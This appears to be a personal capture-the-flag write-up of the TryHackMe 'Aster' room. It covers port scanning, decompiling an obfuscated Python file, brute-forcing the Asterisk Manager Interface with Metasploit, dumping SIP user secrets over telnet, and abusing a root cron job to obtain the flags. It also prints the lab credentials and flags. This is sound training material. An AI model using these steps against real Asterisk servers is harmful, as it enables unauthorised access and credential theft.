<p>July 15, 2025 - Day 435</p>
<h1>Aster</h1>
<p><em>Hack my server dedicated for building communications applications.</em><br>
https://tryhackme.com/room/aster</p>

<br>

<img width="1930" height="489" alt="image" src="https://github.com/user-attachments/assets/57aa1102-c147-45e5-ba63-0cb2272495bc" />

<br>

<h3>rustscan</h3>

```bash
:~/Aster# rustscan -a TargetIP --ulimit 5500 -b 65535
...
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
1720/tcp open  h323q931   syn-ack
2000/tcp open  cisco-sccp syn-ack
5038/tcp open  unknown    syn-ack
```


<h3>Web</h3>

<img width="1056" height="328" alt="image" src="https://github.com/user-attachments/assets/09e7e314-de0a-468a-9fc0-311c69ac9ba5" />


```bash
file output.pyc
output.pyc: python 2.7 byte-compiled
```

<h3>decompily3</h3>

```bash
pip3 install decompily3
```

```bash
decompyle3 output.pyc
# decompyle3 version 3.9.2
# Python bytecode version base 2.7 (62211)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: ./output.py
# Compiled at: 2020-08-11 07:59:35

Unsupported Python version, 2.7, for decompilation


# Unsupported bytecode in file output.pyc
# Unsupported Python version, 2.7, for decompilation
```

<h3>uncompyle6</h3>

```bash
pip3 install uncompyle6
```

<br>

```bash
uncompyle6 output.pyc
# uncompyle6 version 3.9.2
# Python bytecode version base 2.7 (62211)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: ./output.py
# Compiled at: 2020-08-11 07:59:35
import pyfiglet
o0OO00 = pyfiglet.figlet_format('Hello!!')
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
if 0:
    i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
if 0:
    iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
print o0OO00

# okay decompiling output.pyc
```

<br>

```bash
python3 output.py
 _   _      _ _       _ _ 
| | | | ___| | | ___ | | |
| |_| |/ _ \ | |/ _ \| | |
|  _  |  __/ | | (_) |_|_|
|_| |_|\___|_|_|\___/(_|_)
```


<br>

<h3>msfconsole</h3>


```bash
~# msfconsole -q
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf6 > use auxiliary/voip/asterisk_login
msf6 auxiliary(voip/asterisk_login) > options
...
msf6 auxiliary(voip/asterisk_login) > set username admin
username => admin
msf6 auxiliary(voip/asterisk_login) > set rhosts 10.10.21.149
rhosts => 10.10.21.149
msf6 auxiliary(voip/asterisk_login) > run
[*] TargetIP:5038     - Initializing module...
[*] TargetIP:5038     - TargetIP:5038 - Trying user:'admin' with password:'admin'
...
[+] TargetIP:5038     - User: "admin" using pass: "abc123" - can login on TargetIP:5038!
```


<h3>telnet</h3>

```bash
ACTION: LOGIN
Username: admin
SECRET: abc123
EVENTS: ON
```

```bash
telnet TargetIP 5038
Trying TargetIP...
Connected to TargetIP.
Escape character is '^]'.
Asterisk Call Manager/5.0.2

Response: Error
Message: Missing action in request

ACTION: LOGIN
Username: admin
SECRET: abc123
EVENTS: ON

Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 1237
LastReload: 1237
Status: Fully Booted

Action: command
Command: sip show users

Response: Success
Message: Command output follows
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No        
Output: 101                        101                               test             No   No        
Output: harry                      p4ss#w0rd!#                       test             No   No      
```



```bash
ssh harry@TargetIP
...
harry@ubuntu:~$ pwd
/home/harry
harry@ubuntu:~$ ls
Example_Root.jar  user.txt
harry@ubuntu:~$ cat user.txt
thm{bas1c_aster1ck_explotat1on}
```


```bash
harry@ubuntu:~$ unzip Example_Root.jar
Archive:  Example_Root.jar
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF    
  inflating: Example_Root.class      
harry@ubuntu:~$ ls
Example_Root.class  Example_Root.jar  META-INF  user.txt
```

```bash
:~/Aster# ls
Example_Root.class
:~/Aster# file Example_Root.class
Example_Root.class: compiled Java class data, version 55.0
```

```bash
:~/Aster# xxd Example_Root.class
00000000: cafe babe 0000 0037 0042 0a00 1400 210a  .......7.B....!.
00000010: 0004 0022 0800 2307 0024 0a00 0400 250a  ..."..#..$....%.
00000020: 0013 0026 0700 2708 0028 0a00 0700 2508  ...&..'..(....%.
00000030: 0029 0a00 0700 2a0a 0007 002b 0900 2c00  .)....*....+..,.
00000040: 2d08 002e 0a00 2f00 3007 0031 0800 320a  -...../.0..1..2.
00000050: 0010 0033 0700 3407 0035 0100 063c 696e  ...3..4..5...<in
00000060: 6974 3e01 0003 2829 5601 0004 436f 6465  it>...()V...Code
00000070: 0100 0f4c 696e 654e 756d 6265 7254 6162  ...LineNumberTab
00000080: 6c65 0100 0c69 7346 696c 6545 7869 7374  le...isFileExist
00000090: 7301 0011 284c 6a61 7661 2f69 6f2f 4669  s...(Ljava/io/Fi
000000a0: 6c65 3b29 5a01 0004 6d61 696e 0100 1628  le;)Z...main...(
000000b0: 5b4c 6a61 7661 2f6c 616e 672f 5374 7269  [Ljava/lang/Stri
000000c0: 6e67 3b29 5601 000d 5374 6163 6b4d 6170  ng;)V...StackMap
000000d0: 5461 626c 6507 0036 0100 0a53 6f75 7263  Table..6...Sourc
000000e0: 6546 696c 6501 0011 4578 616d 706c 655f  eFile...Example_
000000f0: 526f 6f74 2e6a 6176 610c 0015 0016 0c00  Root.java.......
00000100: 3700 3801 000d 2f74 6d70 2f66 6c61 672e  7.8.../tmp/flag.
00000110: 6461 7401 000c 6a61 7661 2f69 6f2f 4669  dat...java/io/Fi
00000120: 6c65 0c00 1500 390c 0019 001a 0100 126a  le....9........j
00000130: 6176 612f 696f 2f46 696c 6557 7269 7465  ava/io/FileWrite
00000140: 7201 0014 2f68 6f6d 652f 6861 7272 792f  r.../home/harry/
00000150: 726f 6f74 2e74 7874 0100 116d 7920 7365  root.txt...my se
00000160: 6372 6574 203c 3320 6261 6279 0c00 3a00  cret <3 baby..:.
00000170: 390c 003b 0016 0700 3c0c 003d 003e 0100  9..;....<..=.>..
00000180: 1f53 7563 6365 7373 6675 6c6c 7920 7772  .Successfully wr
00000190: 6f74 6520 746f 2074 6865 2066 696c 652e  ote to the file.
000001a0: 0700 3f0c 0040 0039 0100 136a 6176 612f  ..?..@.9...java/
000001b0: 696f 2f49 4f45 7863 6570 7469 6f6e 0100  io/IOException..
000001c0: 1241 6e20 6572 726f 7220 6f63 6375 7272  .An error occurr
000001d0: 6564 2e0c 0041 0016 0100 0c45 7861 6d70  ed...A.....Examp
000001e0: 6c65 5f52 6f6f 7401 0010 6a61 7661 2f6c  le_Root...java/l
000001f0: 616e 672f 4f62 6a65 6374 0100 106a 6176  ang/Object...jav
00000200: 612f 6c61 6e67 2f53 7472 696e 6701 0006  a/lang/String...
00000210: 6973 4669 6c65 0100 0328 295a 0100 1528  isFile...()Z...(
00000220: 4c6a 6176 612f 6c61 6e67 2f53 7472 696e  Ljava/lang/Strin
00000230: 673b 2956 0100 0577 7269 7465 0100 0563  g;)V...write...c
00000240: 6c6f 7365 0100 106a 6176 612f 6c61 6e67  lose...java/lang
00000250: 2f53 7973 7465 6d01 0003 6f75 7401 0015  /System...out...
00000260: 4c6a 6176 612f 696f 2f50 7269 6e74 5374  Ljava/io/PrintSt
00000270: 7265 616d 3b01 0013 6a61 7661 2f69 6f2f  ream;...java/io/
00000280: 5072 696e 7453 7472 6561 6d01 0007 7072  PrintStream...pr
00000290: 696e 746c 6e01 000f 7072 696e 7453 7461  intln...printSta
000002a0: 636b 5472 6163 6500 2100 1300 1400 0000  ckTrace.!.......
000002b0: 0000 0300 0100 1500 1600 0100 1700 0000  ................
000002c0: 1d00 0100 0100 0000 052a b700 01b1 0000  .........*......
000002d0: 0001 0018 0000 0006 0001 0000 0005 0009  ................
000002e0: 0019 001a 0001 0017 0000 001d 0001 0001  ................
000002f0: 0000 0005 2ab6 0002 ac00 0000 0100 1800  ....*...........
00000300: 0000 0600 0100 0000 0800 0900 1b00 1c00  ................
00000310: 0100 1700 0000 a200 0300 0400 0000 4012  ..............@.
00000320: 034c bb00 0459 2bb7 0005 4d2c b800 0699  .L...Y+...M,....
00000330: 001f bb00 0759 1208 b700 094e 2d12 0ab6  .....Y.....N-...
00000340: 000b 2db6 000c b200 0d12 0eb6 000f a700  ..-.............
00000350: 104e b200 0d12 11b6 000f 2db6 0012 b100  .N........-.....
00000360: 0100 0c00 2f00 3200 1000 0200 1800 0000  ..../.2.........
00000370: 3200 0c00 0000 0b00 0300 0c00 0c00 0f00  2...............
00000380: 1300 1100 1d00 1200 2300 1300 2700 1400  ........#...'...
00000390: 2f00 1900 3200 1600 3300 1700 3b00 1800  /...2...3...;...
000003a0: 3f00 1a00 1d00 0000 1000 03fd 002f 0700  ?............/..
000003b0: 1e07 0004 4207 0010 0c00 0100 1f00 0000  ....B...........
000003c0: 0200 20                                  .. 
```


```bash
harry@ubuntu:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
*  *	* * *	root	cd /opt/ && bash ufw.sh
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /root/java/ && bash run.sh
#
```

```bash
harry@ubuntu:~$ ls /tmp
hsperfdata_root  systemd-private-60871ba1cd494f18b93a696a4e6e041b-systemd-timesyncd.service-n9pvI1  VMwareDnD
harry@ubuntu:~$ echo "test" > /tmp/flag.dat
harry@ubuntu:~$ ls /tmp
flag.dat  hsperfdata_root  systemd-private-60871ba1cd494f18b93a696a4e6e041b-systemd-timesyncd.service-n9pvI1  VMwareDnD
harry@ubuntu:~$ tail -f /tmp/flag.dat
test
```



```bash
harry@ubuntu:~$ pwd
/home/harry
harry@ubuntu:~$ ls
Example_Root.class  Example_Root.jar  META-INF  root.txt  user.txt
harry@ubuntu:~$ cat root.txt
thm{fa1l_revers1ng_java} 
```



<br>
<br>

<img width="1895" height="880" alt="image" src="https://github.com/user-attachments/assets/b396ac91-d157-4dd2-86ac-dfb9839ebcac" />

<img width="1884" height="897" alt="image" src="https://github.com/user-attachments/assets/817519b3-0e69-47de-be74-c7a96f62084b" />


<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 15, 2025     | 435      |     156ᵗʰ    |      5ᵗʰ     |    203rd    |     7ᵗʰ    | 115,021  |    861    |    71     |

</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/5a41b92a-60eb-4fbc-a4ed-16ecce325a94" />

<img width="1882" height="900" alt="image" src="https://github.com/user-attachments/assets/9f8c8ab2-cada-4085-8995-a2b25656a277" />

<img width="1888" height="890" alt="image" src="https://github.com/user-attachments/assets/a1b4f8c8-ab27-4539-a92d-52230e1d2b8a" />

<img width="1894" height="892" alt="image" src="https://github.com/user-attachments/assets/38b98e8e-7c90-4e6b-a90c-70f8d0e727e5" />

<img width="1894" height="894" alt="image" src="https://github.com/user-attachments/assets/75ae0008-eb01-4396-994c-f2ed68abb6f2" />
